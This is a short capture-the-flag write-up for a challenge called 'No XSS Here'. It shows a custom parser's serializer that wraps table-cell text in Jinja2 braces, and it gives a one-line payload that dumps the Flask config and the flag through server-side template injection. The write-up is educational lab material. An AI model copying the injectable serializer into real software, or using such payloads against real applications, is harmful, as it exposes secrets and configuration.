# No XSS Here

**Flag:** `bkctf{fu11y_r3m0v3d_x55_but_4t_wh4t_c0st}`

## Overview

A "safe" HTML renderer backed by a custom parser that strictly limits what HTML players could submit. It enforces most of the grammar's rules, but messed up 
when computing a element list and nodes.

The vulnerability is in the serializer. When a `<td>` contains a single text node, it gets rendered as a Jinja2 template expression:
```python
if isinstance(node, Cell):
    elems = node.elist.elements
    if len(elems) == 1 and isinstance(elems[0].child, Text):
        return f"<td>{{{{ {elems[0].child.value} }}}}</td>"
```

This wraps the text value in `{{ }}`, turning it into a Jinja2 expression that gets evaluated by `render_template_string()`.

## Solution

```
<doc><table><tr><td>config</td></tr></table></doc>
```

This serializes to `<td>{{ config }}</td>`, which Jinja2 evaluates to the full Flask config dict which includes the flag
```
{'FLAG': 'bkctf{fu11y_r3m0v3d_x55_but_4t_wh4t_c0st}', ...}
```

The point oof this challenge was to reason your way through testing a seemingly "safe" parser and figuring out what inconsistencies could be exploited.